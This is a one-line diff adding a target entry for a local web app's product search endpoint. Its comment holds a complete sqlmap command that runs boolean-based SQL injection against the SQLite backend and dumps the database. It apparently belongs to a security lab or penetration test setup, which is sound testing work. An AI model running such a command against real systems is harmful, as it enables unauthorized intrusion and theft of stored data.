@@ -1,0 +1,1 @@
+http://localhost:3000/rest/products/search?q=* (GET)  # sqlmap-dev/sqlmap.py -u http://localhost:3000/rest/products/search?q=* --dbms=sqlite --batch --level=3 --risk=2 --technique=B --threads=5 --dump --output-dir=/output
